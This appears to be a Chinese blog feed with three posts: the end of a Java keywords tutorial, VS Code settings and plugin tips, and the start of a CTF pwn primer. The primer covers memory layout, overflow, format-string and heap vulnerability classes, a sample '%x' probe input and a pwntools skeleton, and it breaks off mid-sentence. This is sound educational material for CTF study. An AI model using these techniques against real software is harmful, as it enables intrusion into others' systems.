class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="变量相关的关键词"><a href="#变量相关的关键词" class="headerlink" title="变量相关的关键词"></a>变量相关的关键词</h3><ol><li><p><strong><code>static</code></strong></p><ul><li>用于声明属于类的静态变量，而不是属于类的某个对象。静态变量在内存中只有一份副本，被该类的所有实例共享。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">// 静态变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClass</span><span class="params">()</span> &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>final</code></strong></p><ul><li>当用于变量时，表示该变量是常量，一旦被赋值，就不能被修改。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">PI</span> <span class="operator">=</span> <span class="number">3.14159</span>; <span class="comment">// 常量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>transient</code></strong></p><ul><li>用于指定一个变量不应被序列化。当对象被序列化时（例如保存到文件或通过网络传输），<code>transient</code> 变量的值不会被保存。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">transient</span> <span class="type">int</span> tempVar; <span class="comment">// 不会被序列化的变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>volatile</code></strong></p><ul><li>用于指定一个变量的值可能在多个线程之间变化。<code>volatile</code> 变量的值会直接读取和写入主内存，确保多线程环境下的可见性。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">boolean</span> flag; <span class="comment">// 多线程可见的变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="类的访问权限相关的关键词"><a href="#类的访问权限相关的关键词" class="headerlink" title="类的访问权限相关的关键词"></a>类的访问权限相关的关键词</h3><ol><li><p><strong><code>public</code></strong></p><ul><li>公共访问权限，表示类可以被任何其他类访问。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PublicClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>protected</code></strong></p><ul><li>受保护访问权限，表示类只能在同一个包中访问，或者在不同包中通过继承访问。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">class</span> <span class="title class_">ProtectedClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>default</code>（包访问权限）</strong></p><ul><li>默认访问权限，表示类只能在同一个包中访问。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DefaultClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong><code>private</code></strong></p><ul><li>私有访问权限，表示类只能在定义它的类内部访问，不能被其他类访问。</li><li>示例：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">PrivateClass</span> &#123;</span><br><span class="line">    <span class="comment">// 类的内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><p>这些关键词在 Java 编程中起着关键作用，帮助开发者定义类、创建对象、管理变量以及实现面向对象的特性。</p>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode个性化</title>
      <link href="/posts/1fc0b91f.html"/>
      <url>/posts/1fc0b91f.html</url>
      
        <content type="html"><![CDATA[<h1 id="vscode优化使用体验篇（设置-插件）"><a href="#vscode优化使用体验篇（设置-插件）" class="headerlink" title="vscode优化使用体验篇（设置 | 插件）"></a>vscode优化使用体验篇（设置 | 插件）</h1><blockquote><p>众所周知，vscode是一个非常好用的文本编辑器，通过各式各样的插件几乎是万能的，也可以作为好用的IDE，但vscode有很多默认不开启的、个人认为非常好用的一些设置，因此，在这里与大家分享，同时也推荐几个好用的插件。</p></blockquote><hr><p>vscode官网：<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><h2 id="settings-json"><a href="#settings-json" class="headerlink" title="settings.json"></a>settings.json</h2><blockquote><p>打开vscode，按下<code>Ctrl+Shift+P</code>，输入<code>settings.json</code>，点击<code>首选项：打开用户设置（JSON）</code>，即可打开<code>settings.json</code>文件，在其中添加以下代码即可。<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;files.autoSave&quot;</span><span class="punctuation">:</span> <span class="string">&quot;afterDelay&quot;</span><span class="punctuation">,</span>  <span class="comment">// 自动保存</span></span><br><span class="line">  <span class="attr">&quot;files.autoGuessEncoding&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 自动识别编码</span></span><br><span class="line">  <span class="attr">&quot;editor.cursorBlinking&quot;</span><span class="punctuation">:</span> <span class="string">&quot;smooth&quot;</span><span class="punctuation">,</span>  <span class="comment">// 光标闪烁</span></span><br><span class="line">  <span class="attr">&quot;editor.formatOnPaste&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">// 粘贴时自动格式化</span></span><br><span class="line">  <span class="attr">&quot;editor.formatOnType&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">// 键入时自动格式化</span></span><br><span class="line">  <span class="attr">&quot;editor.formatOnSave&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">// 保存时自动格式化</span></span><br><span class="line">  <span class="attr">&quot;editor.wordWrap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;on&quot;</span><span class="punctuation">,</span>  <span class="comment">// 单行内容过长自动换行</span></span><br><span class="line">  <span class="attr">&quot;editor.guides.bracketPairs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">// 括号匹配</span></span><br><span class="line">  <span class="attr">&quot;editor.acceptSuggestionOnEnter&quot;</span><span class="punctuation">:</span> <span class="string">&quot;smart&quot;</span><span class="punctuation">,</span>  <span class="comment">// 智能回车</span></span><br><span class="line">  <span class="attr">&quot;editor.suggestSelection&quot;</span><span class="punctuation">:</span> <span class="string">&quot;recentlyUsed&quot;</span><span class="punctuation">,</span>  <span class="comment">// 智能补全</span></span><br><span class="line">  <span class="attr">&quot;window.dialogStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;custom&quot;</span><span class="punctuation">,</span>  <span class="comment">// 弹窗样式</span></span><br><span class="line">  <span class="attr">&quot;debug.showBreakpointsInOverviewRuler&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">// 断点显示在概览栏</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p></blockquote><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><blockquote><p>打开vscode，按下<code>Ctrl+Shift+X</code>，输入<code>插件</code>，点击<code>安装</code>，即可安装插件。<br>以下是一些常用的插件，大家可以根据自己的需要安装。</p></blockquote><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>1.One Dark Pro</p><blockquote><p>一个非常好看的主题，同时也支持暗色模式。</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_1.png" alt=""></p><p>2.GitHub Theme</p><blockquote><p>GitHub 的官方主题</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_2.png" alt=""></p><p>3.Dracula Official</p><blockquote><p>一款很有特点的吸血鬼主题</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_3.png" alt=""></p><h3 id="图标主题"><a href="#图标主题" class="headerlink" title="图标主题"></a>图标主题</h3><p>1.Material Icon Theme</p><blockquote><p>个人正在用的图标主题，好看，类型大而全</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_4.png" alt=""></p><p>2.vscode-icons</p><blockquote><p>也是一款不错的图标主题</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_5.png" alt=""></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>1.Vibrancy Continued</p><blockquote><p>使vscode背景高斯模糊，非常吃性能（慎用</p></blockquote><p>使用方法：按F1或者ctrl+shift+p，键入Reload Vibrancy，然后重启vscode</p><p>取消方法：按F1或者ctrl+shift+p，键入Disable Vibrancy，然后重启vscode</p><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_6.png" alt=""></p><p>2.background</p><blockquote><p>可以设置背景图片，非常好用</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_0.png" alt=""></p><blockquote><p>需要在settings.json中修改成以下代码（file:///你自己背景图片的路径）</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_code.png" alt=""></p><h3 id="基础功能类"><a href="#基础功能类" class="headerlink" title="基础功能类"></a>基础功能类</h3><p>1.Chinese (Simplified) (简体中文)</p><blockquote><p>【中文语言包】这应该不用多介绍，是vscode的官方中文语言包</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_7.png" alt=""></p><p>2.Error Lens</p><blockquote><p>【错误提示】可以将原先显示的问题显示在对应行右侧并高亮</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_8.png" alt=""></p><p>3.Path Intellisense</p><blockquote><p>【路径补全】在输入路径时，有智能提示补全</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_9.png" alt=""></p><p>4.Image preview</p><blockquote><p>【图像预览】可以预览引入的图像</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_10.png" alt=""></p><h3 id="拓展功能类"><a href="#拓展功能类" class="headerlink" title="拓展功能类"></a>拓展功能类</h3><p>1.CodeSnap</p><blockquote><p>【代码截图】一款非常好用的代码截图插件</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_11.png" alt=""></p><p>2.Prettier - Code formatter</p><blockquote><p>【代码格式化工具】支持超多语言，一键格式化，美化代码格式</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_12.png" alt=""></p><p>3.GBK to UTF8 for vscode</p><blockquote><p>【文件编码转化】可以将文件在GBK与UTF8编码之间无瑕转换</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_13.png" alt=""></p><p>4.Hex Editor</p><blockquote><p>用来查看文件的hex或UTF-8编码</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_14.png" alt=""></p><p>5.Doxygen Documentation Generator</p><blockquote><p>【文档生成器】写注释和文档时非常好用</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_15.png" alt=""></p><p>6.Remote - SSH</p><blockquote><p>【ssh连接】连接远程服务器或虚拟机</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_16.png" alt=""></p><p>7.Hungry Delete</p><blockquote><p>【像IDEA的退格键】删除整个空格或制表符块，并减少程序员按退格键所需的时间</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_17.png" alt=""></p><h3 id="算法练习类"><a href="#算法练习类" class="headerlink" title="算法练习类"></a>算法练习类</h3><p>1.Code Runner</p><blockquote><p>【代码运行工具】支持多种语言，语言运行环境需自己配置</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_18.png" alt=""></p><p>推荐修改配置：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;code-runner.runInTerminal&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;code-runner.saveAllFilesBeforeRun&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;code-runner.saveFileBeforeRun&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p><p>2.Competitive Programming Helper (cph)</p><blockquote><p>刷算法题时很好用，可以自己设置样例，一键全部运行</p></blockquote><p><img src="https://images.weserv.nl/?url=https://jsd.liiiu.cn/gh/Aurorp1g/CDN/img/1fc0b91f_19.png" alt=""></p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><blockquote><p>以上是我个人的一些设置，大家可以根据自己的需要进行修改，同时也推荐大家安装一些插件，提高自己的开发效率。<br>最后，希望大家都能在vscode中找到自己的风格。  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> VScode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础</title>
      <link href="/posts/4e95fd80.html"/>
      <url>/posts/4e95fd80.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文简单总结一下CTF的pwn方向的知识点，更多详细内容请参考：<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">基础知识-CTF Wiki</a><br>附加博主学习的二进制基础知识视频：<a href="https://www.bilibili.com/video/BV17m411S7F2/?spm_id_from=333.337.search-card.all.click&amp;vd_source=348051f774b468b1bd9ef0632cd78865">二进制程序基础原理入门</a></p></blockquote><h1 id="CTF-Pwn-知识点详解与工具使用说明"><a href="#CTF-Pwn-知识点详解与工具使用说明" class="headerlink" title="CTF Pwn 知识点详解与工具使用说明"></a>CTF Pwn 知识点详解与工具使用说明</h1><h2 id="一、Pwn-是什么"><a href="#一、Pwn-是什么" class="headerlink" title="一、Pwn 是什么"></a>一、Pwn 是什么</h2><p>Pwn 在 CTF 比赛中是一个关键的题目类别，涉及对二进制程序漏洞的利用来获取系统控制权。这个术语源自黑客俚语，是 “own” 的衍生词，意味着攻破系统、获取权限。在 CTF 竞赛里，参赛者需通过发现软件漏洞，如缓冲区溢出、格式化字符串漏洞等，来控制程序执行流程，最终获取 shell 并拿到 flag。</p><h2 id="二、基础概念详解"><a href="#二、基础概念详解" class="headerlink" title="二、基础概念详解"></a>二、基础概念详解</h2><h3 id="（一）二进制基础"><a href="#（一）二进制基础" class="headerlink" title="（一）二进制基础"></a>（一）二进制基础</h3><ol><li><p><strong>可执行文件格式（ELF）</strong></p><ul><li>在 Linux 系统中，可执行文件多为 ELF 格式。它包括 ELF 头、程序头、段等部分，用于描述程序的组织结构与运行方式。</li><li><strong>示例</strong>：一个简单的 ELF 可执行文件 <code>demo.out</code>，通过 <code>readelf -h demo.out</code> 可查看其 ELF 头信息，如类型、入口点等。</li></ul></li><li><p><strong>小端序（Little-Endian）</strong></p><ul><li>Linux 中数据以小端序存储，即低位字节存放在低地址处。例如，数值 <code>0x12345678</code> 在内存中存储顺序为 <code>78 56 34 12</code>。</li></ul></li><li><p><strong>汇编格式</strong></p><ul><li>常见的汇编格式有 Intel 和 AT&amp;T 两种。AT&amp;T 格式在 Linux 中较常用，如 <code>movl $1, %eax</code> 表示将立即数 1 移动到寄存器 EAX。</li></ul></li></ol><h3 id="（二）计算机内存结构"><a href="#（二）计算机内存结构" class="headerlink" title="（二）计算机内存结构"></a>（二）计算机内存结构</h3><ol><li><p><strong>栈（Stack）</strong></p><ul><li>栈用于存储函数调用时的局部变量、参数、返回地址等。其增长方向是内存地址减小的方向。</li><li><strong>图例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">│</span><br><span class="line">├─ 栈底（栈增长方向）</span><br><span class="line">│  │</span><br><span class="line">├─ 局部变量</span><br><span class="line">│  │</span><br><span class="line">├─ 函数参数</span><br><span class="line">│  │</span><br><span class="line">├─ 返回地址</span><br><span class="line">│  │</span><br><span class="line">└─ 栈顶（低地址）</span><br></pre></td></tr></table></figure></li><li>当函数调用时，返回地址、基地址（ebp）等信息会被压入栈中。函数执行完毕后，通过弹出栈顶的返回地址恢复程序执行流程。</li></ul></li><li><p><strong>堆（Heap）</strong></p><ul><li>堆用于动态内存分配，如通过 <code>malloc</code>、<code>free</code> 等函数操作。堆的增长方向是内存地址增大的方向。</li><li><strong>图例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">低地址</span><br><span class="line">│</span><br><span class="line">├─ 堆顶（堆增长方向）</span><br><span class="line">│  │</span><br><span class="line">├─ 已分配内存块</span><br><span class="line">│  │</span><br><span class="line">└─ 高地址</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>数据段（Data Section）与 BSS 段（BSS Section）</strong></p><ul><li>数据段存储已初始化的全局变量和静态变量，BSS 段存储未初始化的全局变量和静态变量。</li></ul></li><li><p><strong>文本段（Text Section）</strong></p><ul><li>文本段存储程序的机器指令代码。</li></ul></li></ol><h3 id="（三）程序执行流程"><a href="#（三）程序执行流程" class="headerlink" title="（三）程序执行流程"></a>（三）程序执行流程</h3><ol><li><p><strong>函数调用机制</strong></p><ul><li>函数调用时，调用者的返回地址、基地址（ebp）等信息被压入栈中，然后跳转到被调用函数的地址执行。</li><li><strong>图例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">调用函数A：</span><br><span class="line">│</span><br><span class="line">├─ 将返回地址压入栈</span><br><span class="line">│  │</span><br><span class="line">├─ 保存基地址（ebp）到栈</span><br><span class="line">│  │</span><br><span class="line">└─ 跳转到函数A的入口地址</span><br><span class="line"></span><br><span class="line">函数A执行完毕：</span><br><span class="line">│</span><br><span class="line">├─ 恢复基地址（ebp）</span><br><span class="line">│  │</span><br><span class="line">└─ 弹出返回地址，跳转回原函数继续执行</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>返回地址的作用</strong></p><ul><li>函数执行完毕后，通过弹出栈顶的返回地址来恢复程序的执行流程，使程序跳转回调用该函数的位置继续执行后续代码。</li></ul></li></ol><h3 id="（四）常见漏洞类型详解"><a href="#（四）常见漏洞类型详解" class="headerlink" title="（四）常见漏洞类型详解"></a>（四）常见漏洞类型详解</h3><ol><li><p><strong>栈溢出</strong></p><ul><li>当程序使用如 <code>gets()</code>、<code>scanf(&quot;%s&quot;)</code>、<code>read()</code> 等函数时，若未对输入数据的长度进行严格限制，可能导致输入的数据超出缓冲区大小，从而覆盖栈中的其他数据，包括返回地址，进而改变程序执行流程。</li><li><strong>图例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">正常情况：</span><br><span class="line">│</span><br><span class="line">├─ 栈内存布局</span><br><span class="line">│  │</span><br><span class="line">├─ 缓冲区（大小为N）</span><br><span class="line">│  │</span><br><span class="line">├─ 返回地址</span><br><span class="line">│  │</span><br><span class="line">└─ 其他数据</span><br><span class="line"></span><br><span class="line">栈溢出情况：</span><br><span class="line">│</span><br><span class="line">├─ 输入数据超过缓冲区大小</span><br><span class="line">│  │</span><br><span class="line">├─ 覆盖返回地址</span><br><span class="line">│  │</span><br><span class="line">└─ 改变程序执行流程</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>数组下标溢出</strong></p><ul><li>若程序对数组的上界或下界未进行判断，攻击者可通过精心构造的输入，使程序访问或修改数组以外的内存区域，导致任意位置的读写，改变程序行为。</li></ul></li><li><p><strong>格式化字符串漏洞</strong></p><ul><li>主要利用 <code>printf</code> 等函数的格式化字符串漏洞。当程序将用户输入直接作为格式化字符串时，攻击者可构造特定的格式化字符串，实现栈区内读写，泄露栈中信息或篡改数据。</li><li><strong>图例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞代码示例：</span><br><span class="line">printf(user_input);  // user_input 未经过滤直接作为格式化字符串</span><br><span class="line"></span><br><span class="line">攻击者输入：</span><br><span class="line">%x%x%x...  // 构造格式化字符串，读取栈中内容</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">泄露栈中信息，如返回地址、函数指针等</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>堆利用</strong></p><ul><li>包括 UAF（Use After Free）、劫持 <code>__malloc_hook</code>、修改 <code>__IO_1_2_stdout</code> 等。例如，UAF 漏洞是由于在释放一块堆内存后，未正确重置指针，导致程序可能再次使用已释放的内存，攻击者可利用此情况使程序执行任意代码。</li><li><strong>图例</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UAF 漏洞示例：</span><br><span class="line">│</span><br><span class="line">├─ 分配堆块A</span><br><span class="line">│  │</span><br><span class="line">├─ 释放堆块A，但未重置指针</span><br><span class="line">│  │</span><br><span class="line">├─ 攻击者重新分配堆块A的位置，填充恶意数据</span><br><span class="line">│  │</span><br><span class="line">└─ 程序再次使用已释放的堆块A，执行恶意数据</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>整数溢出</strong></p><ul><li>当整数运算超过其表示范围时，可能会导致意外行为。例如，在内存分配时，若计算分配大小的整数发生溢出，可能导致分配的内存大小远小于预期，后续写入数据时超出分配范围，覆盖其他内存区域，引发漏洞。</li></ul></li><li><p><strong>未初始化变量</strong></p><ul><li>使用未初始化的变量可能导致不可预测的行为。攻击者可能通过控制程序环境或输入，使未初始化的变量取特定值，从而影响程序逻辑，引发安全问题。</li></ul></li><li><p><strong>双重释放（Double Free）</strong></p><ul><li>对同一块内存进行两次 <code>free</code> 操作，可能导致堆管理器的混乱。攻击者可利用此漏洞，通过精心构造的内存操作，使程序在后续的内存分配和使用中执行恶意代码。</li></ul></li><li><p><strong>堆风水（Heap Feng Shui）</strong></p><ul><li>通过精心控制堆的分配和释放，攻击者能够预测和控制堆块的布局。例如，在特定位置分配恶意构造的数据，当程序执行到相关操作时，触发漏洞，实现代码执行等恶意行为。</li></ul></li></ol><h2 id="三、工具使用说明"><a href="#三、工具使用说明" class="headerlink" title="三、工具使用说明"></a>三、工具使用说明</h2><h3 id="（一）pwntools"><a href="#（一）pwntools" class="headerlink" title="（一）pwntools"></a>（一）pwntools</h3><ol><li><p><strong>安装</strong></p><ul><li>在 Python3 环境下，通过 <code>python3 -m pip install pwntools</code> 命令安装。</li></ul></li><li><p><strong>功能</strong></p><ul><li>用于快速构建 CTF 漏洞利用脚本，简化二进制漏洞的开发和利用过程。</li></ul></li><li><p><strong>使用示例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建本地进程连接</span></span><br><span class="line">io = process(<span class="string">&#x27;./vulnerable_program&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建远程连接</span></span><br><span class="line"><span class="comment"># io = remote(&#x27;host&#x27;, port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收数据</span></span><br><span class="line">data = io.recvline()  <span class="comment"># 接收一行数据</span></span><br><span class="line">data = io.recvuntil(<span class="string">&#x27;prompt&#x27;</span>)  <span class="comment"># 接收直到遇到指定提示符的数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送数据</span></span><br><span class="line">io.send(<span class="string">&#x27;data&#x27;</span>)  <span class="comment"># 发送数据</span></span><br><span class="line">io.sendline(<span class="string">&#x27;data&#x27;</span>)  <span class="comment"># 发送数据并在末尾添加换行符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭连接</span></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></li><li><p><strong>模块介绍</strong></p><ul><li><strong>context</strong>：设置架构、字节序、日志级别等全局参数。例如，<code>context.arch = &#39;amd64&#39;</code> 设置架构为 64 位，<code>context.endian = &#39;little&#39;</code> 设置字节序为小端。</li><li><strong>elf</strong>：解析 ELF 文件，获取程序的符号表、段信息等。例如，<code>elf = ELF(&#39;./vulnerable_program&#39;)</code> 加载 ELF 文件，<code>elf.symbols</code> 